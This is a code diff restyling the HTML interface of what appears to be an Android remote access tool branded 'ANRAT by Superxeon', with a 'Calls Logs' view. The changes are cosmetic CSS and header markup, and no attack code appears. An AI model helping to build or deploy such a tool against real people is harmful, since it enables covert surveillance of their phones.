@@ -12,7 +12,6 @@
         }
     </script>
 
-
     <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
     <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
     <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
@@ -20,7 +19,6 @@
     <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
     <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
     <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>
-
 
     <!-- Insert this line after script imports -->
     <script>
@@ -33,8 +31,42 @@
     <style>
         #logy {
             height: 158px;
-            /* Adjust the height value as per your preference */
             overflow: scroll;
+        }
+        
+        body {
+            background-color: #0c094f;
+        }
+        
+        #icons {
+            width: 50px;
+            height: 50px;
+        }
+        
+        #tulisan {
+            font-size: 18px;
+            color: white;
+            margin: 0;
+            line-height: 50px;
+        }
+        
+        .header-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .ui.inverted.mini.text.labeled.icon.menu {
+            position: relative;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px !important;
+        }
+        
+        .ui.inverted.mini.text.labeled.icon.menu .right.menu {
+            position: absolute;
+            right: 10px;
         }
     </style>
 
@@ -46,9 +78,12 @@
         <div class="row h10">
             <div class="sixteen wide column">
                 <div class="ui inverted mini text labeled icon menu">
-                    <a class="item">
-                        <img src="assets/img/icon.png" /> </a>
-                    <div class="right  menu notDraggable">
+                    <div class="header-center">
+                        <img src="assets/img/icon.png" id="icons"/>
+                        <p id="tulisan">ANRAT by Superxeon</p>
+                    </div>
+                    
+                    <div class="right menu notDraggable">
                         <button class="ui circular green button" ng-click="maximize()"
                             style="font-size: 6px;height: 17px"></button>
                         <button class="ui circular red button" ng-click="close()"
@@ -83,12 +118,8 @@
                         <i class="black call icon "></i> Calls Logs
                     </a>
                 </div>
-
             </div>
         </div>
-
-
-
 
         <div class="row centered h75 notDraggable ">
             <div class="sixteen wide column">
@@ -98,9 +129,8 @@
                 </div>
             </div>
         </div>
-
-
     </div>
+    
     <div class="ui bottom attached black message notDraggable " id="logy" style="overflow: scroll;">
         <div ng-repeat="log in logs " class="log ">
             <div class="w30 " style="display: inline-block " ng-bind="log.date "></div>
